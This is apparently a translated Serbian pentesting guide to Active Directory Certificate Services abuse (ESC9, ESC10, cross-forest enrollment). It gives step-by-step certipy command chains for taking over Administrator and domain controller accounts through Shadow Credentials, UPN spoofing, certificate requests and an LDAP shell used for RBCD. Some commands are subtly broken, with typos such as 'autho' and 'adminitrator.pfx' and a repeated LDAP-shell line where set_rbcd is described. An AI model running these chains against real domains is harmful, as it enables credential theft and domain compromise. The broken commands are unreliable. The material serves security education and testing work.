Nova vrednost **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) za **`msPKI-Enrollment-Flag`**, poznata kao ESC9, sprečava ugradnju **novog sigurnosnog proširenja `szOID_NTDS_CA_SECURITY_EXT`** u sertifikat. Ova zastavica postaje relevantna kada je `StrongCertificateBindingEnforcement` postavljen na `1` (podrazumevana vrednost), što se razlikuje od postavke `2`. Njena važnost se povećava u scenarijima gde bi slabiji mapiranje sertifikata za Kerberos ili Schannel moglo biti iskorišćeno (kao u ESC10), s obzirom da odsustvo ESC9 ne bi promenilo zahteve.

Uslovi pod kojima postavljanje ove zastavice postaje značajno uključuju:

* `StrongCertificateBindingEnforcement` nije podešen na `2` (podrazumevana vrednost je `1`), ili `CertificateMappingMethods` uključuje zastavicu `UPN`.
* Sertifikat je obeležen zastavicom `CT_FLAG_NO_SECURITY_EXTENSION` unutar postavke `msPKI-Enrollment-Flag`.
* Sertifikat sadrži bilo koju EKU (Enhanced Key Usage) za autentifikaciju klijenta.
* Postoje `GenericWrite` dozvole nad bilo kojim nalogom kako bi se kompromitovala drugačija.

### Zloupotreba scenarija

Pretpostavimo da `John@corp.local` ima `GenericWrite` dozvole nad `Jane@corp.local`, sa ciljem da kompromituje `Administrator@corp.local`. Šablon sertifikata `ESC9`, u koji `Jane@corp.local` ima dozvolu da se upiše, konfigurisan je sa zastavicom `CT_FLAG_NO_SECURITY_EXTENSION` u postavci `msPKI-Enrollment-Flag`.

Početno, `Jane`-in heš se dobija korišćenjem Shadow Credentials, zahvaljujući `John`-ovom `GenericWrite`:

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

Nakon toga, `userPrincipalName` korisnika `Jane` je izmenjen u `Administrator`, svesno izostavljajući deo domena `@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Ova modifikacija ne krši ograničenja, s obzirom da `Administrator@corp.local` ostaje različit kao `userPrincipalName` od `Administrator`.

Nakon toga, šablona za sertifikat `ESC9`, označena kao ranjiva, se zahteva kao `Jane`:

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

Primetno je da `userPrincipalName` sertifikata odražava `Administratora`, bez ikakvog "object SID"-a.

`userPrincipalName` za `Jane` se zatim vraća na njen originalni, `Jane@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Pokušaj autentifikacije sa izdatim sertifikatom sada daje NT heš za `Administrator@corp.local`. Komanda mora da uključuje `-domain <domain>` zbog nedostatka specifikacije domena u sertifikatu:

```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```

## Slabe mape sertifikata - ESC10

### Objašnjenje

Dve vrednosti registarskog ključa na kontroloru domena se odnose na ESC10:

* Podrazumevana vrednost za `CertificateMappingMethods` pod `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` je `0x18` (`0x8 | 0x10`), prethodno postavljena na `0x1F`.
* Podrazumevana postavka za `StrongCertificateBindingEnforcement` pod `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` je `1`, prethodno `0`.

**Slučaj 1**

Kada je `StrongCertificateBindingEnforcement` konfigurisan kao `0`.

**Slučaj 2**

Ako `CertificateMappingMethods` uključuje bit `UPN` (`0x4`).

### Zloupotreba slučaja 1

Sa konfigurisanim `StrongCertificateBindingEnforcement` kao `0`, nalog A sa dozvolama `GenericWrite` može biti iskorišćen da se kompromituje bilo koji nalog B.

Na primer, imajući dozvole `GenericWrite` nad `Jane@corp.local`, napadač ima za cilj da kompromituje `Administrator@corp.local`. Postupak je sličan ESC9, što omogućava korišćenje bilo kog šablona sertifikata.

Prvo se dobija heš vrednost za `Jane` korišćenjem Shadow Credentials, iskorišćavajući `GenericWrite`.

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

Nakon toga, `userPrincipalName` korisnika `Jane` je promenjen u `Administrator`, svesno izostavljajući deo `@corp.local` kako bi se izbeglo kršenje ograničenja.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Nakon toga, zahteva se sertifikat koji omogućava autentifikaciju klijenta kao `Jane`, koristeći podrazumevani `User` šablon.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`userPrincipalName` od `Jane` zatim se vraća na originalnu vrednost, `Jane@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Autentifikacija sa dobijenim sertifikatom će rezultirati NT hešom `Administrator@corp.local`, što zahteva navođenje domena u komandi zbog odsustva detalja o domenu u sertifikatu.

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### Zloupotreba slučaja 2

Sa `CertificateMappingMethods` koji sadrži `UPN` bit flag (`0x4`), nalog A sa `GenericWrite` dozvolama može kompromitovati bilo koji nalog B koji nema svojstvo `userPrincipalName`, uključujući mašinske naloge i ugrađeni administratorski nalog domena `Administrator`.

Ovde je cilj kompromitovati `DC$@corp.local`, počevši od dobijanja `Jane`-inog heša putem Shadow Credentials, iskorišćavajući `GenericWrite`.

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

`userPrincipalName` od `Jane` zatim je postavljen na `DC$@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

Zahtevan je sertifikat za autentifikaciju klijenta kao `Jane` koristeći podrazumevani `User` šablon.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`userPrincipalName` od `Jane` se vraća na originalnu vrednost nakon ovog procesa.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

Za autentifikaciju putem Schannela koristi se Certipy-eva opcija `-ldap-shell`, koja označava uspeh autentifikacije kao `u:CORP\DC$`.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Kroz LDAP shell, komande poput `set_rbcd` omogućavaju napade na ograničeno delegiranje resursa (RBCD), što potencijalno kompromituje kontroler domena.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Ova ranjivost se takođe odnosi na bilo koji korisnički nalog koji nema `userPrincipalName` ili kada se ne podudara sa `sAMAccountName`, pri čemu je podrazumevani `Administrator@corp.local` glavna meta zbog svojih povišenih LDAP privilegija i nedostatka `userPrincipalName` po podrazumevanju.

## Kompromitovanje šuma pomoću sertifikata objašnjeno pasivnim glagolskim oblikom

### Prekid šumske poverenice kompromitovanim CA

Konfiguracija za **prekograničnu registraciju** je relativno jednostavna. **Root CA sertifikat** iz resursnog šuma je **objavljen u šumovima naloga** od strane administratora, a **enterprise CA** sertifikati iz resursnog šuma su **dodati u `NTAuthCertificates` i AIA kontejnere u svakom šumu naloga**. Da bismo razjasnili, ovaj aranžman daje **CA u resursnom šumu potpunu kontrolu** nad svim drugim šumovima za koje upravlja PKI. Ako ovaj CA bude **kompromitovan od strane napadača**, sertifikati za sve korisnike u resursnom i šumu naloga mogu biti **falsifikovani od strane njih**, čime se krši sigurnosna granica šuma.

### Dodeljivanje privilegija registracije stranim principima

U okruženjima sa više šumova, potrebna je opreznost u vezi sa Enterprise CA koje **objavljuju šablone sertifikata** koji omogućavaju **Autentifikovanim korisnicima ili stranim principima** (korisnicima/grupama van šuma kojem Enterprise CA pripada) **prava registracije i izmene**.\
Prilikom autentifikacije preko poverenja, SID **Autentifikovanih korisnika** se dodaje tokenu korisnika od strane AD. Dakle, ako domen poseduje Enterprise CA sa šablonom koji **omogućava Autentifikovanim korisnicima prava registracije**, šablon bi potencijalno mogao biti **registrovan od strane korisnika iz drugog šuma**. Slično tome, ako **prava registracije eksplicitno dodeljuju stranom principu putem šablona**, time se stvara **prekogranični odnos kontrole pristupa**, omogućavajući principu iz jednog šuma da **registruje šablon iz drugog šuma**.

Oba scenarija dovode do **povećanja površine napada** iz jednog šuma u drugi. Postavke šablona sertifikata mogu biti iskorišćene od strane napadača kako bi se dobile dodatne privilegije u stranom domenu.
